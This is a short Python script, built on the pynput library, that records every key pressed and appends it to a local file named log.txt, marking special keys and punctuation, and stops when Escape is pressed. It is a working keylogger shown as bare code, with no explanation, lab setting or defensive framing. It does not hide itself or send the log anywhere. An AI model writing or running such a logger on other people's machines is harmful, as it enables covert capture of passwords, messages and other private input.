import pynput
from pynput.keyboard import Key, Listener

keys = []


def key_press(key):
    keys.append(key)
    file_write(key)


def file_write(key):
    special_characters = ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '=', '+', '{', '}', '[', ']', ':',
                          ';', '"', "'", '<', '>', ',', '.', '?', '/']

    with open('log.txt', 'a') as file:  # Append mode to keep adding to the file
        if isinstance(key, Key):
            if key == Key.space:
                file.write(' ')
            else:
                file.write(f'[{key}]')
        else:
            k = str(key).replace("'", "")
            if k in special_characters:
                file.write(f'({k})')
            else:
                file.write(k)


def on_release(key):
    if key == Key.esc:
        return False  # Stop the listener


with Listener(on_press=key_press, on_release=on_release) as listener:
    listener.join()
